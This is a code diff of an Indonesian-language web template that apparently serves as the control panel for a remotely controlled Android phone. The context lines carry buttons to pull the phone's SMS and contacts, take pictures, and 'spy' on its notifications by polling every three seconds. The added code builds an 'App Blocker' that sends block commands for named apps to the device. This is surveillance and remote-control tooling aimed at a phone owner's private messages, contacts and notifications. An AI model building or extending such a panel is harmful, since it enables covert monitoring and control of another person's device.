@@ -38,6 +38,7 @@
         .action-btn-red { background-color: #ff3b30; color: #fff; }
         .status { margin-bottom: 20px; padding: 15px; border: 1px dashed #00ff00; text-align: center; color: #00ff00; background: #001100; border-radius: 10px;}
         .grid-btn { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center; }
         .modal-content { background: #121212; border: 2px solid #00ff00; border-radius: 16px; width: 90%; max-width: 400px; padding: 20px; }
         .modal-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; }
@@ -49,6 +50,7 @@
 <body>
     <div class="header"><h1>[ {{ device.name }} ]</h1><a href="/" class="btn-back">← Kembali</a></div>
     <div class="status" id="status-box">Menunggu perintah...</div>
+    
     <button class="btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 HENTIKAN SEMUA (PANIC) 🚨</button>
 
     <div class="card">
@@ -97,6 +99,7 @@
                 <button class="action-btn" onclick="bukaModal('sms')">📩 Ambil SMS</button>
                 <button class="action-btn" onclick="bukaModal('contacts')">👥 Ambil Kontak</button>
                 <button class="action-btn" onclick="bukaModal('notifs')" style="background:#ffcc00;">🔔 Spy Notif</button>
+                <button class="action-btn" onclick="bukaModal('app_blocker')" style="background:#ff3b30; color:white; grid-column: span 2;">🚫 App Blocker</button>
             </div>
         </div>
     </div>
@@ -155,7 +158,14 @@
                 document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">Memuat data...</div>';
                 cekNotif();
                 if(intervalId) clearInterval(intervalId);
-                intervalId = setInterval(() => { cekNotif(); }, 3000); // Refresh tiap 3 detik
+                intervalId = setInterval(() => { cekNotif(); }, 3000);
+            } else if (type === 'app_blocker') {
+                document.getElementById('modal-title').innerText = '🚫 App Blocker';
+                document.getElementById('modal-body').innerHTML = `
+                    <p style="font-size:12px; color:#aaa; margin-bottom:10px;">Masukkan package name (pisahkan dengan koma).<br>Contoh: <b>com.zhiliaoapp.musically</b> (TikTok), <b>com.mobile.legends</b> (ML).</p>
+                    <input type="text" id="blocked_input" placeholder="com.package1, com.package2" style="width:100%; padding:12px; margin-bottom:15px; background:#222; border:1px solid #00ff00; color:white; box-sizing:border-box;">
+                    <button class="action-btn" onclick="simpanBlokir()">SIMPAN & BLOKIR</button>
+                `;
             } else {
                 document.getElementById('modal-title').innerText = '📸 Mengambil Gambar...';
                 kirimPerintah(type);
@@ -193,11 +203,17 @@
                                 '<div style="color:#ccc;">' + n.text + '</div>' +
                                 '</div>';
                     });
-                } else {
-                    html = '<div style="text-align:center; color:#888;">Belum ada notifikasi masuk.</div>';
-                }
+                } else { html = '<div style="text-align:center; color:#888;">Belum ada notifikasi masuk.</div>'; }
                 document.getElementById('modal-body').innerHTML = html;
             });
+        }
+
+        function simpanBlokir() {
+            var apps = document.getElementById('blocked_input').value;
+            if(!apps) return alert("Package name kosong!");
+            kirimPerintah('block_apps|' + apps);
+            alert("Perintah blokir dikirim ke HP!");
+            tutupModal();
         }
     </script>
 </body>
